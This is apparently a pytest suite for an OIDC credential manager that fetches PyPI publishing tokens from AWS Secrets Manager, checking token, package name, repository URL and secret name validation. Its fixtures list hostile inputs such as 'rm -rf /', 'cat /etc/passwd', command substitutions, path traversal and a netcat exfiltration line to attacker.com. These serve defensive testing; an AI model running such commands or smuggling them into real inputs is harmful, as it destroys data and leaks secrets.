"""Enhanced security tests for OIDC authentication system.

This module provides additional security-focused tests for OIDC authentication
that complement the existing test suite with specific focus on:
- OIDC token handling and security measures (Requirements 3.1, 3.2)
- Credential exposure prevention (Requirements 3.2, 3.5)
- Publishing authorization and scope limitations (Requirements 3.1, 3.2, 3.3)
"""

import json
import os
from pathlib import Path
import sys
import tempfile
from unittest.mock import Mock, patch

from botocore.exceptions import ClientError
import pytest

# Add scripts directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "scripts"))

from oidc_credential_manager import OIDCCredentialManager

# Test constants - these are fake tokens for testing
VALID_TEST_TOKEN = (  # Test token, not real credential
    "pypi-AgEIcHlwaS5vcmcCJRVOaXMxLjAyAAABhGlkAAABhGh0dHBzOi8vcHlwaS5vcmcvbGVnYWN5Lw"  # noqa: S105
)
VALID_TEST_TOKEN_2 = (  # Test token, not real credential
    "pypi-BgEIcHlwaS5vcmcCJRVOaXMxLjAyAAABhGlkAAABhGh0dHBzOi8vcHlwaS5vcmcvbGVnYWN5Lw"  # noqa: S105
)


class TestOIDCTokenSecurityMeasures:
    """Test OIDC token handling and security measures."""

    def test_token_format_strict_validation(self) -> None:
        """Test strict PyPI token format validation for security."""
        manager = OIDCCredentialManager("test-secret")
        mock_client = Mock()

        # Test various token formats that should be rejected
        invalid_tokens = [
            "",  # Empty token
            "pypi-",  # Too short
            "pypi-" + "A" * 10,  # Too short (minimum 50 chars after prefix)
            "not-pypi-token",  # Wrong prefix
            "pypi-" + "A" * 200,  # Too long (maximum 200 chars total)
            "pypi-" + "A" * 50 + "\n",  # Contains newline
            "pypi-" + "A" * 50 + " ",  # Contains space
            "pypi-" + "A" * 50 + "\t",  # Contains tab
            "pypi-" + "A" * 30 + "/../../../etc/passwd",  # Path traversal attempt
            "pypi-" + "A" * 30 + "; rm -rf /",  # Command injection
            "pypi-" + "A" * 30 + "<script>",  # XSS attempt
            "pypi-" + "A" * 30 + "${HOME}",  # Variable expansion attempt
        ]

        for invalid_token in invalid_tokens:
            secret_data = {
                "token": invalid_token,
                "repository": "https://upload.pypi.org/legacy/",
                "package": "mypylogger",
            }
            mock_client.get_secret_value.return_value = {"SecretString": json.dumps(secret_data)}
            manager.secrets_client = mock_client

            with pytest.raises(Exception, match="Invalid PyPI token format"):
                manager.retrieve_pypi_token()

    def test_token_character_set_validation(self) -> None:
        """Test that tokens only contain allowed characters."""
        manager = OIDCCredentialManager("test-secret")
        mock_client = Mock()

        # Valid token should only contain alphanumeric, hyphens, underscores
        valid_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
        valid_token = "pypi-" + "".join([valid_chars[i % len(valid_chars)] for i in range(50)])

        secret_data = {
            "token": valid_token,
            "repository": "https://upload.pypi.org/legacy/",
            "package": "mypylogger",
        }
        mock_client.get_secret_value.return_value = {"SecretString": json.dumps(secret_data)}
        manager.secrets_client = mock_client

        # Should not raise exception for valid token
        result = manager.retrieve_pypi_token()
        assert result["token"] == valid_token

        # Test invalid characters
        invalid_chars = [
            "!",
            "@",
            "#",
            "$",
            "%",
            "^",
            "&",
            "*",
            "(",
            ")",
            "+",
            "=",
            "[",
            "]",
            "{",
            "}",
            "|",
            "\\",
            ":",
            ";",
            '"',
            "'",
            "<",
            ">",
            "?",
            ",",
            ".",
            "/",
            "~",
            "`",
        ]

        for invalid_char in invalid_chars:
            invalid_token = f"pypi-{'A' * 30}{invalid_char}{'A' * 19}"
            secret_data["token"] = invalid_token
            mock_client.get_secret_value.return_value = {"SecretString": json.dumps(secret_data)}

            with pytest.raises(Exception, match="Invalid PyPI token format"):
                manager.retrieve_pypi_token()

    def test_aws_role_arn_validation(self) -> None:
        """Test AWS role ARN format validation for security."""
        # Test valid ARN formats
        valid_arns = [
            "arn:aws:iam::123456789012:role/GitHubActions-Role",
            "arn:aws:iam::999999999999:role/MyProject-PyPI-Publisher",
            "arn:aws:iam::000000000000:role/test-role-123",
        ]

        for arn in valid_arns:
            # Should not raise exception for valid ARNs
            # This would be validated in the actual AWS OIDC setup
            assert arn.startswith("arn:aws:iam::")
            assert ":role/" in arn
            assert len(arn.split(":")) == 6

    def test_secret_name_injection_prevention(self) -> None:
        """Test that secret names are validated to prevent injection attacks."""
        # Test various malicious secret names
        malicious_names = [
            "../../../etc/passwd",  # Path traversal
            "secret; rm -rf /",  # Command injection
            "secret && cat /etc/passwd",  # Command chaining
            "secret | nc attacker.com 1234",  # Data exfiltration
            "secret`whoami`",  # Command substitution
            "secret$(id)",  # Command substitution
            "secret\nrm -rf /",  # Newline injection
        ]

        for malicious_name in malicious_names:
            # The OIDCCredentialManager should accept the name but AWS will validate it
            manager = OIDCCredentialManager(malicious_name)
            assert manager.secret_name == malicious_name

            # AWS Secrets Manager will reject invalid secret names during actual calls
            mock_client = Mock()
            mock_client.describe_secret.side_effect = ClientError(
                {"Error": {"Code": "ValidationException", "Message": "Invalid secret name"}},
                "DescribeSecret",
            )
            manager.secrets_client = mock_client

            # Should return False for invalid secret names
            result = manager.test_secrets_access()
            assert result is False

    def test_token_entropy_validation(self) -> None:
        """Test that tokens have sufficient entropy for security."""
        manager = OIDCCredentialManager("test-secret")
        mock_client = Mock()

        # Test low-entropy tokens that should be rejected
        low_entropy_tokens = [
            "pypi-" + "A" * 50,  # All same character
            "pypi-" + "AAAAAAAAAA" * 5,  # Repeated pattern
            "pypi-" + "1234567890" * 5,  # Sequential numbers
            "pypi-" + "abcdefghij" * 5,  # Sequential letters
        ]

        for low_entropy_token in low_entropy_tokens:
            secret_data = {
                "token": low_entropy_token,
                "repository": "https://upload.pypi.org/legacy/",
                "package": "mypylogger",
            }
            mock_client.get_secret_value.return_value = {"SecretString": json.dumps(secret_data)}
            manager.secrets_client = mock_client

            # Current implementation should check entropy and catch obviously invalid patterns
            with pytest.raises(Exception, match="Unexpected error retrieving PyPI token"):
                manager.retrieve_pypi_token()


class TestCredentialExposurePrevention:
    """Test comprehensive credential exposure prevention measures."""

    def test_environment_variable_masking(self) -> None:
        """Test that sensitive environment variables are masked in logs."""
        sensitive_env_vars = [
            "AWS_ACCESS_KEY_ID",
            "AWS_SECRET_ACCESS_KEY",
            "AWS_SESSION_TOKEN",
            "PYPI_API_TOKEN",
            "PYPI_TOKEN",
            "GITHUB_TOKEN",
        ]

        with patch("logging.getLogger") as mock_get_logger:
            mock_logger = Mock()
            mock_get_logger.return_value = mock_logger

            # Set sensitive environment variables
            test_values = {}
            for var in sensitive_env_vars:
                test_values[var] = f"sensitive-value-{var.lower()}"
                os.environ[var] = test_values[var]

            try:
                manager = OIDCCredentialManager("test-secret")

                # Trigger operations that might log environment info
                manager.get_credential_summary()

                # Verify no sensitive values appear in logs
                all_log_calls = (
                    mock_logger.info.call_args_list
                    + mock_logger.warning.call_args_list
                    + mock_logger.error.call_args_list
                    + mock_logger.debug.call_args_list
                )

                for call in all_log_calls:
                    log_message = str(call)
                    for var, value in test_values.items():
                        assert value not in log_message, (
                            f"Sensitive value {var} found in log: {log_message}"
                        )

            finally:
                # Clean up environment variables
                for var in sensitive_env_vars:
                    if var in os.environ:
                        del os.environ[var]

    def test_exception_message_sanitization(self) -> None:
        """Test that exception messages don't expose sensitive information."""
        manager = OIDCCredentialManager("test-secret")
        mock_client = Mock()

        # Test exception with sensitive information in AWS error message
        sensitive_arn = "arn:aws:sts::123456789012:assumed-role/GitHubActions-Role/GitHubActions"
        sensitive_error = ClientError(
            {
                "Error": {
                    "Code": "AccessDenied",
                    "Message": (
                        f"User: {sensitive_arn} is not authorized to perform: "
                        "secretsmanager:GetSecretValue"
                    ),
                }
            },
            "GetSecretValue",
        )

        mock_client.get_secret_value.side_effect = sensitive_error
        manager.secrets_client = mock_client

        # Exception should be sanitized
        with pytest.raises(Exception, match="Access denied") as exc_info:
            manager.retrieve_pypi_token()

        error_message = str(exc_info.value)
        # Should not contain the full ARN or account ID
        assert "123456789012" not in error_message
        assert sensitive_arn not in error_message
        # Should contain generic error message
        assert "Access denied to PyPI token secret" in error_message

    def test_memory_cleanup_after_token_use(self) -> None:
        """Test that tokens are cleared from memory after use."""
        manager = OIDCCredentialManager("test-secret")
        mock_client = Mock()

        secret_data = {
            "token": VALID_TEST_TOKEN,
            "repository": "https://upload.pypi.org/legacy/",
            "package": "mypylogger",
        }
        mock_client.get_secret_value.return_value = {"SecretString": json.dumps(secret_data)}
        manager.secrets_client = mock_client

        # Retrieve token
        token_data = manager.retrieve_pypi_token()
        original_token = token_data["token"]

        # Verify token is returned correctly
        assert original_token == secret_data["token"]

        # The token should not be stored in the manager instance
        # Check that manager doesn't have any attributes containing the token
        for attr_name in dir(manager):
            if not attr_name.startswith("_"):
                attr_value = getattr(manager, attr_name)
                if isinstance(attr_value, str):
                    assert original_token not in attr_value

    def test_temporary_file_security(self) -> None:
        """Test that no temporary files contain credentials."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Change to temp directory to catch any temp file creation
            original_cwd = Path.cwd()
            os.chdir(temp_dir)

            try:
                manager = OIDCCredentialManager("test-secret")
                mock_client = Mock()

                secret_data = {
                    "token": VALID_TEST_TOKEN_2,
                    "repository": "https://upload.pypi.org/legacy/",
                    "package": "mypylogger",
                }
                mock_client.get_secret_value.return_value = {
                    "SecretString": json.dumps(secret_data)
                }
                manager.secrets_client = mock_client

                # Perform operations
                manager.retrieve_pypi_token()
                manager.get_credential_summary()

                # Check that no files were created in temp directory
                temp_files = list(Path(temp_dir).rglob("*"))
                assert len(temp_files) == 0, f"Unexpected temporary files created: {temp_files}"

            finally:
                os.chdir(original_cwd)

    def test_log_redaction_patterns(self) -> None:
        """Test that log messages properly redact sensitive patterns."""
        with patch("logging.getLogger") as mock_get_logger:
            mock_logger = Mock()
            mock_get_logger.return_value = mock_logger

            manager = OIDCCredentialManager("test-secret")

            # Simulate logging with sensitive patterns
            sensitive_patterns = [
                VALID_TEST_TOKEN,
                "AKIAIOSFODNN7EXAMPLE",
                "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                "arn:aws:sts::123456789012:assumed-role/role-name/session-name",
            ]

            # Trigger credential summary which might log information
            manager.get_credential_summary()

            # Verify no sensitive patterns appear in any log messages
            all_log_calls = (
                mock_logger.info.call_args_list
                + mock_logger.warning.call_args_list
                + mock_logger.error.call_args_list
                + mock_logger.debug.call_args_list
            )

            for call in all_log_calls:
                log_message = str(call)
                for pattern in sensitive_patterns:
                    assert pattern not in log_message, f"Sensitive pattern found in log: {pattern}"


class TestPublishingAuthorizationScope:
    """Test publishing authorization and scope limitations."""

    @patch("requests.get")
    def test_pypi_token_scope_validation(self, mock_requests: Mock) -> None:
        """Test that PyPI tokens are validated for correct scope."""
        manager = OIDCCredentialManager("test-secret")

        # Test token with correct scope (should return 200)
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            "projects": ["mypylogger"],
            "permissions": ["upload"],
        }
        mock_requests.return_value = mock_response

        result = manager.validate_token_permissions("pypi-valid-token")
        assert result is True

        # Verify correct API endpoint was called
        call_args = mock_requests.call_args
        assert "https://pypi.org/pypi/mypylogger/json" in call_args[0][0]
        assert call_args[1]["headers"]["Authorization"] == "token pypi-valid-token"

    @patch("requests.get")
    def test_pypi_token_insufficient_permissions(self, mock_requests: Mock) -> None:
        """Test detection of tokens with insufficient permissions."""
        manager = OIDCCredentialManager("test-secret")

        # Test various permission failure scenarios
        permission_failures = [
            (401, "Unauthorized - invalid token"),
            (403, "Forbidden - insufficient permissions"),
            (404, "Not found - package doesn't exist or no access"),
        ]

        for status_code, description in permission_failures:
            mock_response = Mock()
            mock_response.status_code = status_code
            mock_requests.return_value = mock_response

            result = manager.validate_token_permissions("pypi-limited-token")
            assert result is False, f"Should fail for {description}"

    def test_aws_role_permission_scope_validation(self) -> None:
        """Test AWS role permission scope validation."""
        manager = OIDCCredentialManager("test-secret")

        # Mock STS client with role information
        mock_sts_client = Mock()

        # Test role with correct permissions
        mock_sts_client.get_caller_identity.return_value = {
            "Account": "123456789012",
            "Arn": (
                "arn:aws:sts::123456789012:assumed-role/GitHubActions-PyPI-Publisher/GitHubActions"
            ),
            "UserId": "AIDACKCEVSQ6C2EXAMPLE",
        }

        with patch("boto3.client", return_value=mock_sts_client):
            auth_result = manager.verify_aws_authentication()

            # Verify role name indicates PyPI publishing scope
            assert "PyPI" in auth_result["arn"] or "pypi" in auth_result["arn"].lower()
            assert auth_result["authenticated"] is True

    def test_secret_access_scope_limitation(self) -> None:
        """Test that secret access is limited to specific secrets."""
        manager = OIDCCredentialManager("mypylogger/pypi-token")
        mock_client = Mock()

        # Test access to correct secret
        mock_client.describe_secret.return_value = {"Name": "mypylogger/pypi-token"}
        manager.secrets_client = mock_client

        result = manager.test_secrets_access()
        assert result is True

        # Test that access to other secrets would fail
        other_secrets = [
            "other-project/pypi-token",
            "mypylogger/database-password",
            "production/api-keys",
        ]

        for secret_name in other_secrets:
            manager_other = OIDCCredentialManager(secret_name)
            mock_client_other = Mock()
            mock_client_other.describe_secret.side_effect = ClientError(
                {"Error": {"Code": "AccessDenied", "Message": "Access denied"}},
                "DescribeSecret",
            )
            manager_other.secrets_client = mock_client_other

            result = manager_other.test_secrets_access()
            assert result is False, f"Should not have access to {secret_name}"

    def test_repository_url_validation(self) -> None:
        """Test that repository URLs are validated for security."""
        manager = OIDCCredentialManager("test-secret")
        mock_client = Mock()

        # Test valid PyPI repository URLs
        valid_repos = [
            "https://upload.pypi.org/legacy/",
            "https://test.pypi.org/legacy/",
        ]

        for repo_url in valid_repos:
            secret_data = {
                "token": VALID_TEST_TOKEN,
                "repository": repo_url,
                "package": "mypylogger",
            }
            mock_client.get_secret_value.return_value = {"SecretString": json.dumps(secret_data)}
            manager.secrets_client = mock_client

            # Should not raise exception for valid repository URLs
            result = manager.retrieve_pypi_token()
            assert result["repository"] == repo_url

        # Test invalid repository URLs that should be rejected
        invalid_repos = [
            "http://upload.pypi.org/legacy/",  # HTTP instead of HTTPS
            "https://malicious-site.com/pypi/",  # Wrong domain
            "https://upload.pypi.org/../../../etc/passwd",  # Path traversal
            "ftp://upload.pypi.org/legacy/",  # Wrong protocol
            "javascript:alert('xss')",  # JavaScript injection
        ]

        for repo_url in invalid_repos:
            secret_data = {
                "token": VALID_TEST_TOKEN,
                "repository": repo_url,
                "package": "mypylogger",
            }
            mock_client.get_secret_value.return_value = {"SecretString": json.dumps(secret_data)}
            manager.secrets_client = mock_client

            with pytest.raises(Exception, match="Invalid repository URL"):
                manager.retrieve_pypi_token()

    def test_package_name_validation(self) -> None:
        """Test that package names are validated for security."""
        manager = OIDCCredentialManager("test-secret")
        mock_client = Mock()

        # Test valid package names
        valid_packages = [
            "mypylogger",
            "my-package",
            "package_name",
            "package123",
        ]

        for package_name in valid_packages:
            secret_data = {
                "token": VALID_TEST_TOKEN,
                "repository": "https://upload.pypi.org/legacy/",
                "package": package_name,
            }
            mock_client.get_secret_value.return_value = {"SecretString": json.dumps(secret_data)}
            manager.secrets_client = mock_client

            # Should not raise exception for valid package names
            result = manager.retrieve_pypi_token()
            assert result["package"] == package_name

        # Test invalid package names
        invalid_packages = [
            "",  # Empty name
            "package with spaces",  # Spaces not allowed
            "package/with/slashes",  # Slashes not allowed
            "../../../etc/passwd",  # Path traversal
            "package;rm -rf /",  # Command injection
            "package`whoami`",  # Command substitution
        ]

        for package_name in invalid_packages:
            secret_data = {
                "token": VALID_TEST_TOKEN,
                "repository": "https://upload.pypi.org/legacy/",
                "package": package_name,
            }
            mock_client.get_secret_value.return_value = {"SecretString": json.dumps(secret_data)}
            manager.secrets_client = mock_client

            with pytest.raises(Exception, match="Invalid package name"):
                manager.retrieve_pypi_token()


class TestOIDCWorkflowSecurityIntegration:
    """Test OIDC workflow security integration with GitHub Actions."""

    def test_github_actions_oidc_token_format(self) -> None:
        """Test GitHub Actions OIDC token format validation."""
        # Simulate GitHub Actions environment
        github_env = {
            "GITHUB_ACTIONS": "true",
            "GITHUB_ACTOR": "github-actions[bot]",
            "GITHUB_REPOSITORY": "stabbotco1/mypylogger",
            "GITHUB_REF": "refs/heads/main",
            "GITHUB_SHA": "abc123def456",
        }

        with patch.dict(os.environ, github_env):
            OIDCCredentialManager("test-secret")

            # Verify environment is detected as GitHub Actions
            assert os.environ.get("GITHUB_ACTIONS") == "true"
            assert os.environ.get("GITHUB_REPOSITORY") == "stabbotco1/mypylogger"

    def test_workflow_permission_validation(self) -> None:
        """Test that workflow permissions are properly configured."""
        # This would typically be validated by examining the workflow file
        # Here we test the expected permission structure

        required_permissions = {
            "id-token": "write",  # Required for OIDC
            "contents": "read",  # Minimal read access
        }

        # Verify no excessive permissions are granted
        # These permissions should not be granted for PyPI publishing
        _excessive_permissions = [
            "actions: write",
            "checks: write",
            "deployments: write",
            "issues: write",
            "packages: write",
            "pages: write",
            "pull-requests: write",
            "repository-projects: write",
            "security-events: write",
            "statuses: write",
        ]

        # In a real workflow, these would be parsed from .github/workflows files
        # Here we validate the expected structure
        for level in required_permissions.values():
            assert level in ["read", "write"], f"Invalid permission level: {level}"

    def test_oidc_audience_validation(self) -> None:
        """Test OIDC audience validation for security."""
        # Valid audiences for AWS OIDC
        valid_audiences = [
            "sts.amazonaws.com",
            "https://sts.amazonaws.com",
        ]

        # Invalid audiences that should be rejected
        invalid_audiences = [
            "malicious-site.com",
            "sts.fake-aws.com",
            "https://attacker.com",
            "",
        ]

        for audience in valid_audiences:
            # Should be accepted (this would be validated by AWS STS)
            assert audience.endswith("sts.amazonaws.com")

        for audience in invalid_audiences:
            # Should be rejected
            assert not audience.endswith("sts.amazonaws.com")

    def test_github_repository_validation(self) -> None:
        """Test GitHub repository validation for OIDC trust."""
        # Valid repository formats
        valid_repos = [
            "stabbotco1/mypylogger",
            "organization/project-name",
            "user/repo_name",
        ]

        # Invalid repository formats
        invalid_repos = [
            "",  # Empty
            "single-name",  # Missing organization
            "org/repo/extra",  # Too many parts
            "../../../etc/passwd",  # Path traversal
            "org/repo;rm -rf /",  # Command injection
        ]

        for repo in valid_repos:
            parts = repo.split("/")
            assert len(parts) == 2, f"Invalid repo format: {repo}"
            assert all(part.replace("-", "").replace("_", "").isalnum() for part in parts)

        for repo in invalid_repos:
            parts = repo.split("/")
            if len(parts) == 2:
                # Check for invalid characters
                assert not all(part.replace("-", "").replace("_", "").isalnum() for part in parts)
            else:
                assert len(parts) != 2, f"Repo should be invalid: {repo}"
